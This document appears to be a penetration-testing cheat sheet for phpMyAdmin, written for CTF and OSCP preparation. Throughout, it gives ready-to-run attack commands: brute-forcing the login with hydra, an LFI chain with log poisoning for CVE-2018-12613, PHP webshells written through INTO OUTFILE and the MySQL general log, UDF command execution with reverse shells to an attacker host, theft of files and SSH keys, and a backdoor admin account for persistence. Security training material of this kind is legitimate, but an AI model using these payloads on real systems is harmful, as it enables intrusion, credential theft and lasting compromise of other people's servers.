# phpMyAdmin

> phpMyAdmin database management tool reference for penetration testing. Covers
> detection, enumeration, known CVEs, exploitation patterns, misconfigurations,
> and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Default paths

phpMyAdmin is usually installed under one of:

- `/phpmyadmin/`
- `/phpMyAdmin/`
- `/pma/`
- `/mysql/`
- `/dbadmin/`
- `/adminer/` (different tool, see Adminer.md)
- `/myadmin/`
- `/pma2/`
- Custom path (any name)

```bash
for p in phpmyadmin phpMyAdmin pma mysql dbadmin myadmin pma2 pma3 \
         admin/mysql dbadmin/mysql php-my-admin PMA; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p/")
  echo "$code  /$p/"
done
```

### HTML markers

```bash
curl -s http://<TARGET>/phpmyadmin/ | grep -iE 'phpmyadmin|pma_|token='
```

Expected output:

```html
<title>phpMyAdmin 5.2.0</title>
<meta name="author" content="phpMyAdmin devel team" />
<link rel="stylesheet" href="themes/pmahomme/css/theme.css" />
<script src="js/dist/main.js?v=5.2.0"></script>
<input type="hidden" name="token" value="abc123..." />
```

Strong fingerprints:
- `<title>phpMyAdmin</title>` with version
- `token=` hidden input (CSRF token)
- `themes/pmahomme/` path (default theme)
- `js/dist/main.js` in modern versions
- `/setup/` (setup directory, often accessible)

### Response headers

```bash
curl -sI http://<TARGET>/phpmyadmin/ | grep -iE '^(server|x-powered-by|set-cookie|location)'
```

Expected output:

```text
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: phpMyAdmin=abc123...; path=/phpmyadmin; HttpOnly
Set-Cookie: pma_lang=en; path=/phpmyadmin
```

`phpMyAdmin` and `pma_lang` cookies are definitive.

### Version

phpMyAdmin version is often visible in:
- `<title>` tag
- `/phpmyadmin/README` file
- `/phpmyadmin/ChangeLog`
- `/phpmyadmin/Documentation.html`
- `js/dist/main.js?v=<version>` query string
- HTTP `Last-Modified` on static assets

```bash
curl -s http://<TARGET>/phpmyadmin/ | grep -oE 'phpMyAdmin [0-9.]+'
curl -s http://<TARGET>/phpmyadmin/README | head -5
curl -s http://<TARGET>/phpmyadmin/ChangeLog | head -10
curl -s http://<TARGET>/phpmyadmin/Documentation.html | grep -oE 'phpMyAdmin [0-9.]+' | head -1
```

### Default files

- `index.php` - main entry (login)
- `/setup/` - setup wizard (should be disabled, often isn't)
- `config.inc.php` - config file (never served directly, but backups may leak)
- `README`, `ChangeLog`, `LICENSE`
- `Documentation.html`
- `js/`, `themes/`, `libraries/`
- `sql.php` - SQL execution endpoint
- `import.php` - file import (uploads)
- `export.php` - export
- `server_sql.php`, `db_sql.php`, `tbl_sql.php`

### nmap / whatweb

```bash
nmap -sV -p 80,443 --script http-headers,http-title,http-phpmyadmin-dir-traversal <TARGET>
whatweb -a 3 http://<TARGET>/phpmyadmin/
```

---

## 2. Enumeration

### Default credentials

phpMyAdmin itself has no default login; it connects to MySQL. Default MySQL
credentials:

- `root` / (empty)
- `root` / `root`
- `root` / `toor`
- `root` / `password`
- `root` / `mysql`
- `root` / `changeme`

Or a local user:

- `admin` / `admin`
- `pma` / `pma`
- `phpmyadmin` / `phpmyadmin`

Test via login form:

```bash
curl -s -X POST http://<TARGET>/phpmyadmin/index.php \
  -d "pma_username=root&pma_password=&server=1&token=<token>"
```

Or via `hydra`:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&token=<token>:Cannot log in to the MySQL server"
```

Note: CSRF token is required. Update the token for each attempt or disable
the check via a prepared script.

### Setup directory

```bash
curl -s http://<TARGET>/phpmyadmin/setup/
curl -s http://<TARGET>/phpmyadmin/setup/index.php
```

If the setup wizard is accessible without auth -> write a new
`config.inc.php` (or add a new server entry with arbitrary host) -> potential
RCE (see section 4).

### Configuration leak

```bash
for f in config.inc.php config.inc.php.bak config.inc.php.old \
         config.inc.php~ config.inc.php.swp config.inc.php.save \
         config.inc.php.orig; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/phpmyadmin/$f")
  echo "$code  $f"
done
```

If leaked, contains MySQL credentials.

### Version in ChangeLog / README

```bash
curl -s http://<TARGET>/phpmyadmin/ChangeLog | head -20
curl -s http://<TARGET>/phpmyadmin/README | grep -i version | head -5
```

### Documentation.html

```bash
curl -s http://<TARGET>/phpmyadmin/Documentation.html | grep -oE 'phpMyAdmin [0-9.]+'
```

### Login error messages

phpMyAdmin login errors:

```text
# mysqli_real_connect(): (HY000/1045): Access denied for user 'root'@'localhost' (using password: NO)
# mysqli_real_connect(): (HY000/1045): Access denied for user 'root'@'localhost' (using password: YES)
```

The first message (using password: NO) vs second (using password: YES)
confirms whether a password is required - not a user enumeration vector, but
hints at config.

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/phpmyadmin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,inc,dist,txt,html
```

Common phpMyAdmin paths:

- `/setup/index.php`
- `/sql.php`
- `/import.php`
- `/export.php`
- `/server_status.php`
- `/server_variables.php`
- `/server_privileges.php`
- `/db_structure.php`

### Known paths

```bash
for p in setup/ setup/index.php sql.php import.php export.php \
         server_sql.php server_privileges.php db_sql.php tbl_sql.php \
         Documentation.html README ChangeLog LICENSE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/phpmyadmin/$p")
  echo "$code  /phpmyadmin/$p"
done
```

### Server info disclosure

If you can log in with low-priv credentials, immediately check:

- `Status -> Server` - server version, MySQL version, Uptime
- `Variables` - `datadir`, `basedir`, `secure_file_priv`, `plugin_dir`
- `Users` - full user list (if enough privileges)
- `Databases` - all accessible databases

---

## 3. Known CVEs

phpMyAdmin has a long history of CVEs, especially XSS and SQL injection.

### Recent high-impact CVEs

#### CVE-2023-25727 - XSS in drag-and-drop upload

Stored XSS via drag-and-drop file upload interface.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-25727
Affected: phpMyAdmin < 5.2.1.

#### CVE-2023-25728 - Stored XSS via SQL query

Stored XSS in the SQL query results view.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-25728
Affected: phpMyAdmin < 5.2.1.

#### CVE-2022-0813 - Local file inclusion (LFI)

LFI via `$cfg['Servers'][$i]['auth_type']` parameter in special configs.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-0813
Affected: phpMyAdmin < 5.1.2.

#### CVE-2020-26935 - SQL injection in `sql.php`

Authenticated SQL injection via crafted parameters.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-26935
Affected: phpMyAdmin < 5.0.4.

#### CVE-2019-18622 - SQL injection in `db_designer.php`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-18622
Affected: phpMyAdmin < 4.9.2.

#### CVE-2018-19968 - LFI via `tbl_import.php`

Arbitrary file read via crafted POST.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-19968
Affected: phpMyAdmin < 4.8.4.

PoC:

```bash
curl -X POST http://<TARGET>/phpmyadmin/tbl_import.php \
  -b "phpMyAdmin=<session>" \
  -d "import_type=table&import_file=/etc/passwd&..."
```

#### CVE-2018-12613 - LFI in `index.php`

**Widely exploited.** Unauthenticated LFI via crafted `target` parameter,
leading to RCE via log poisoning.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-12613
Affected: phpMyAdmin 4.8.0 - 4.8.1.

PoC:

```bash
# 1. Verify LFI
curl "http://<TARGET>/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../etc/passwd"

# 2. Poison the MySQL error log or Apache access log
curl -A "<?php system(\$_GET['c']); ?>" http://<TARGET>/

# 3. Include the log via LFI
curl "http://<TARGET>/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../var/log/apache2/access.log&c=id"
```

#### CVE-2016-5734 - RCE via `preg_replace` /e modifier

RCE via `preg_replace` with `/e` modifier in `Util::pregReplace`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2016-5734
Affected: phpMyAdmin 4.0.x - 4.6.2.

PoC:

```bash
# Requires valid session + ability to run a specific SQL query
# Public exploit: https://www.exploit-db.com/exploits/40185
```

#### CVE-2014-8959 - LFI in `gis_data_editor.php`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2014-8959

#### CVE-2013-3238 - RCE via `preg_replace`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2013-3238

#### CVE-2011-2505 - LFI in `libraries/auth`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2011-2505

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| < 5.2.1 | Stored XSS | CVE-2023-25727 / 25728 |
| < 5.1.2 | LFI | CVE-2022-0813 |
| < 5.0.4 | SQLi | CVE-2020-26935 |
| < 4.9.2 | SQLi | CVE-2019-18622 |
| < 4.8.4 | LFI | CVE-2018-19968 |
| 4.8.0-4.8.1 | LFI + RCE | CVE-2018-12613 |
| 4.0-4.6.2 | RCE | CVE-2016-5734 |

---

## 4. Exploitation Patterns

### Default credentials

```bash
# Common MySQL root passwords
for p in "" "root" "toor" "password" "mysql" "changeme" "admin" "123456"; do
  echo "Trying: root / $p"
  # POST with token...
done
```

For quick testing, use the phpMyAdmin login page with browser automation
(Playwright/Puppeteer) to handle the CSRF token.

Or use `patator` / `hydra` with token handling script.

### CVE-2018-12613 - Unauthenticated LFI + RCE

Most exploited phpMyAdmin CVE in CTFs.

```bash
# 1. Verify LFI (phpMyAdmin 4.8.0 - 4.8.1)
curl "http://<TARGET>/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../etc/passwd"

# Expected output: /etc/passwd content

# 2. Poison the Apache access log with PHP code
curl -A "<?php system(\$_GET['c']); ?>" http://<TARGET>/

# 3. Include the poisoned log
curl "http://<TARGET>/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../var/log/apache2/access.log&c=id"

# Alternative log locations:
# - /var/log/apache2/access.log
# - /var/log/nginx/access.log
# - /var/log/httpd/access_log
```

Also works with `session` files:

```bash
# Poison a session file via MySQL query
# 1. Login as any user (or use an existing session)
# 2. Run: SELECT '<?php system($_GET["c"]); ?>'
# 3. The query is logged in the session file
# 4. LFI to /var/lib/php/sessions/sess_<sessionid>&c=id
```

### Setup directory -> config write -> RCE

If `/setup/` is accessible:

1. Create a new server entry with attacker-controlled host.
2. Save config (creates `config/config.inc.php`).
3. Log in with the new server (attacker's MySQL).
4. Use `LOAD DATA LOCAL INFILE` to read files or use MySQL RCE vectors.

Alternatively, the setup directory often allows defining a `$cfg['Servers']`
entry pointing to the attacker's rogue MySQL server. Then phpMyAdmin
authenticates to the rogue server, which can respond with malicious data
(including a `FILE` read via `LOAD DATA LOCAL INFILE`).

### Setup directory -> write to arbitrary path (if writable)

Some phpMyAdmin setups allow the setup wizard to write `config.inc.php` to
a user-controlled path:

```bash
# Craft a POST that includes a path parameter
# (Varies by version, see CVE-2010-3055 etc.)
```

### Authenticated -> RCE via `preg_replace` (CVE-2016-5734)

Requires phpMyAdmin 4.0.x - 4.6.2 + valid session.

```bash
# Public exploit
git clone https://github.com/Amblis/phpmyadmin-4.6.2-rce
python phpmyadmin-4.6.2-rce/poc.py http://<TARGET>/phpmyadmin/ root password
```

### Authenticated -> RCE via `INTO OUTFILE` (SQL)

With valid MySQL credentials and `FILE` privilege:

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

Then:

```bash
curl "http://<TARGET>/shell.php?c=id"
```

Note: `secure_file_priv` may restrict this. Check via:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

If it returns a path (e.g. `/var/lib/mysql-files/`), write there:

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell.php';
```

Then find a way to include or trigger via the DB (or use MySQL UDF for RCE).

### RCE via MySQL UDF (with FILE + INSERT privilege)

```sql
-- 1. Upload the UDF library (raptor_udf2.so) as hex
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/raptor.so';

-- 2. Create function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'raptor.so';

-- 3. Execute
SELECT sys_exec('id > /tmp/out');
SELECT sys_exec('bash -i >& /dev/tcp/<attacker>/4444 0>&1');
```

Or use existing `lib_mysqludf_sys`:

```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('/bin/bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"');
```

### File read via `LOAD_FILE`

With FILE privilege:

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.inc.php');
SELECT LOAD_FILE('/root/.ssh/id_rsa');
```

`secure_file_priv` may restrict this.

### File read via `LOAD DATA LOCAL INFILE`

With `local_infile=ON` (often on for phpMyAdmin):

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE temp_table;
SELECT * FROM temp_table;
```

If `local_infile` is on, attacker's rogue MySQL can read arbitrary files from
the client side (useful for SSRF-like chains).

### Rogue MySQL server (reverse file read)

If `LOAD DATA LOCAL INFILE` is enabled and phpMyAdmin connects to your
attacker-controlled MySQL:

1. Run `rogue_mysql_server.py` (Metasploit: `auxiliary/server/mysql_client_rogue`).
2. Make phpMyAdmin connect to your rogue server (via setup directory or config
   file).
3. The rogue server requests `/etc/passwd` via `LOCAL INFILE`.
4. File content is sent to the rogue server.

Tool: `https://github.com/Gifts/Rogue-MySql-Server`.

### Credentials exfiltration from `config.inc.php`

If you have LFI, read:

- `/etc/phpmyadmin/config.inc.php` (Debian/Ubuntu)
- `/var/www/html/phpmyadmin/config.inc.php`
- `/usr/share/phpmyadmin/config.inc.php`

```bash
curl "http://<TARGET>/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../etc/phpmyadmin/config.inc.php"
```

Extract: MySQL user, password, host.

### Login as DB user -> upload shell via SQL

With DB creds (either from config or brute force):

1. Log in via phpMyAdmin.
2. Use SQL tab.
3. `SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`
4. Access shell.

### RCE via MySQL general log

If `general_log` can be enabled:

```sql
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SET GLOBAL general_log = 'ON';
SELECT '<?php system($_GET["c"]); ?>';
SET GLOBAL general_log = 'OFF';
```

Then:

```bash
curl "http://<TARGET>/shell.php?c=id"
```

### Setup directory abuse

If `/setup/index.php` accessible:

1. Add a new server configuration with `host` pointing to attacker.
2. Configure `auth_type = 'config'` with known credentials.
3. Save (writes to `config/config.inc.php`).
4. phpMyAdmin now uses the new config.

If the app allows writing the config to a webroot path, direct webshell:

```php
# Malicious config.inc.php content
<?php system($_GET['c']); ?>
$cfg['Servers'][$i]['host'] = 'localhost';
...
```

### phpMyAdmin + MySQL 4.x auth bypass (old)

Very old MySQL versions had auth bypass vulnerabilities. Rarely encountered
today.

---

## 5. Misconfigurations

### Setup directory exposed

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/phpmyadmin/setup/
```

If 200 -> setup wizard enabled -> high risk.

### Default credentials

```bash
# Try common combos
for combo in "root:" "root:root" "root:toor" "root:password" "admin:admin"; do
  user=${combo%%:*}
  pass=${combo##*:}
  echo "Trying $user / $pass"
  # POST with token...
done
```

### Config file exposed

```bash
for f in config.inc.php config.inc.php.bak config.inc.php.old \
         config.inc.php~ config.inc.php.swp config/config.inc.php; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/phpmyadmin/$f")
  echo "$code  $f"
done
```

### Version disclosure

```bash
curl -s http://<TARGET>/phpmyadmin/ | grep -oE 'phpMyAdmin [0-9.]+'
curl -s http://<TARGET>/phpmyadmin/ChangeLog | head -20
```

### Missing HTTPS

```bash
curl -sI http://<TARGET>/phpmyadmin/ | head -1
```

If no redirect to HTTPS -> credentials sent in cleartext.

### Weak MySQL password

```bash
# Test common passwords
# (Use script with token handling)
```

### phpMyAdmin installed at default path

Default path `/phpmyadmin/` is easily discovered. Rename for obscurity
(though not a real security measure).

### Directory listing

```bash
curl -s http://<TARGET>/phpmyadmin/themes/ | grep -i 'index of'
curl -s http://<TARGET>/phpmyadmin/js/ | grep -i 'index of'
```

### Backup files

```bash
for f in config.inc.php.backup config.inc.php.txt config.inc.php.orig \
         config.inc.php.save phpmyadmin.sql phpmyadmin.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/phpmyadmin/$f")
  echo "$code  $f"
done
```

### `pma` user with no password

Some distros create a `pma` user (phpMyAdmin control user) with no password
by default:

```bash
# Try: pma / (empty)
```

### Open `/server_status.php` without auth

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/phpmyadmin/server_status.php
```

### Log files not rotated

```bash
curl -s http://<TARGET>/phpmyadmin/error_log
```

### Long-running SQL queries exposed

If `/server_status.php` is accessible without auth (misconfig), the queries
list may leak DB activity.

---

## 6. Post-Exploitation

### Config file locations

| OS | Path |
|----|------|
| Debian/Ubuntu | `/etc/phpmyadmin/config.inc.php` |
| Debian/Ubuntu (user) | `/etc/phpmyadmin/conf.d/*.php` |
| RHEL/CentOS | `/etc/phpMyAdmin/config.inc.php` |
| Manual install | `<webroot>/phpmyadmin/config.inc.php` |
| XAMPP | `C:\xampp\phpMyAdmin\config.inc.php` |
| MAMP | `/Applications/MAMP/bin/phpMyAdmin/config.inc.php` |

### What to look for

```bash
cat /etc/phpmyadmin/config.inc.php
cat /etc/phpmyadmin/conf.d/*.php 2>/dev/null
```

Key items:

- `$cfg['Servers'][$i]['host']` - MySQL host
- `$cfg['Servers'][$i]['user']` - MySQL user
- `$cfg['Servers'][$i]['password']` - MySQL password
- `$cfg['Servers'][$i]['controluser']` - control user (often `pma`)
- `$cfg['Servers'][$i]['controlpass']` - control password
- `$cfg['blowfish_secret']` - cookie encryption key

### Database access via CLI

```bash
mysql -h <host> -u <user> -p<password>
```

### Database enumeration from phpMyAdmin

If logged in via web UI:

1. `Databases` tab -> lists all DBs accessible to user.
2. Click a DB -> list tables.
3. `SQL` tab -> run arbitrary SQL.
4. `Import` tab -> upload SQL files (potential for SQL-based attacks).
5. `Export` tab -> dump to file (read server data).

### Extract MySQL users

```sql
SELECT user, host, authentication_string FROM mysql.user;
SELECT user, host, plugin FROM mysql.user;
```

If MySQL is `root`, password hashes may be reusable (cracking or pass-the-hash
in some configs).

### Extract DB credentials from other apps

With broad DB access, read other apps' configs stored in DB:

```sql
SELECT * FROM wordpress.wp_options WHERE option_name LIKE '%password%';
SELECT * FROM joomla.jos_users;
SELECT * FROM drupal.users;
SELECT * FROM prestashop.ps_employee;
```

### Write webshell

With FILE privilege:

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

Or general log method (see section 4).

### MySQL UDF for RCE

See section 4.

### Access MySQL files

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/lib/mysql/mysql/user.MYD');
```

`mysql/user.MYD` contains MySQL user table data.

### Persist via MySQL

1. Create a new admin user:

```sql
CREATE USER 'attacker'@'%' IDENTIFIED BY 'pwned';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

2. Or add a trigger / event that runs periodically.

### Extract InnoDB data files

If you have filesystem access (via LFI or shell):

```bash
cp /var/lib/mysql/<db>/<table>.ibd /tmp/
# Analyze with ibd2sql / undrop-for-innodb
```

### Logs

phpMyAdmin may log to:
- `/var/log/phpmyadmin/`
- `<webroot>/phpmyadmin/log/`

```bash
ls -la /var/log/phpmyadmin/ 2>/dev/null
cat /var/log/phpmyadmin/*.log 2>/dev/null
```

Logs contain: SQL queries, login attempts, errors.

### Access MySQL error log

```bash
cat /var/log/mysql/error.log
tail -n 200 /var/log/mysql/error.log | grep -i 'access denied'
```

Reveals failed login attempts (usernames, IPs).

### Privilege escalation

With MySQL root + FILE privilege, RCE is possible. Once you have shell as
`mysql` or `www-data`, standard Linux privesc:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
uname -a
```

MySQL often runs as `mysql` user with no shell. Webshell as `www-data` ->
standard privesc path.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the phpMyAdmin version from `<title>` OR `/ChangeLog` - it proves the exact version.

> [!IMPORTANT]
> OSCP report: for CVE-2018-12613 (LFI + RCE), screenshot the LFI PoC AND the resulting command output (via log poisoning).

> [!IMPORTANT]
> OSCP report: for `INTO OUTFILE` webshell, screenshot the SQL query AND the access to the resulting shell URL.

---

## 8. References

- phpMyAdmin official docs - https://docs.phpmyadmin.net/
- phpMyAdmin security advisories - https://www.phpmyadmin.net/security/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=phpmyadmin
- CVE-2018-12613 writeup - https://www.exploit-db.com/exploits/44924
- CVE-2016-5734 writeup - https://www.exploit-db.com/exploits/40185
- HackTricks - phpMyAdmin - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/phpmyadmin
- MySQL UDF - https://github.com/mysqludf/lib_mysqludf_sys
- Rogue MySQL - https://github.com/Gifts/Rogue-MySql-Server

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
